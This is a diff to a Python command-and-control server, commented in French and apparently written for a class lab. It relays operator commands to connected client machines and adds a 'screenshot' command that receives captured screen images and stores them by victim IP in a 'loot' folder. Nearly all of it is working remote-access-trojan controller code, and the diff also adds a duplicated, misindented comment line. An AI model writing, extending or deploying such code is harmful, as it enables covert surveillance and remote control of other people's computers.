@@ -19,16 +19,34 @@ def gerer_client(conn, addr):
                 break
                 
             # On envoie la commande au client
+                        # On envoie la commande au client
             conn.send(cmd.encode("utf-8"))
             
-            # On attend la reponse
-            reponse = conn.recv(4096).decode("utf-8")
-            
-            if not reponse:
-                print("[-] Le client a ferme la connexion.")
-                break
+            # --- NOUVEAU : Si on demande une capture d'ecran ---
+            if cmd == "screenshot":
+                # On recoit les donnees brutes (binaire), pas du texte
+                # 1 Mo max pour une image c'est suffisant pour le TP
+                data = conn.recv(1024 * 1024) 
                 
-            print(reponse)
+                if data:
+                    # On cree un nom de fichier unique base sur l'IP du client
+                    nom_fichier = f"loot/screen_{addr[0]}.png"
+                    
+                    # On ouvre en mode binaire ('wb' pour write binary)
+                    with open(nom_fichier, "wb") as f:
+                        f.write(data)
+                    print(f"[+] Capture d'ecran sauvegardee dans {nom_fichier}")
+                else:
+                    print("[-] Erreur : aucune donnee recue pour la capture.")
+            else:
+                # Comportement normal (texte)
+                reponse = conn.recv(4096).decode("utf-8")
+                
+                if not reponse:
+                    print("[-] Le client a ferme la connexion.")
+                    break
+                    
+                print(reponse)
             
         except Exception as e:
             print(f"[-] Erreur avec le client : {e}")
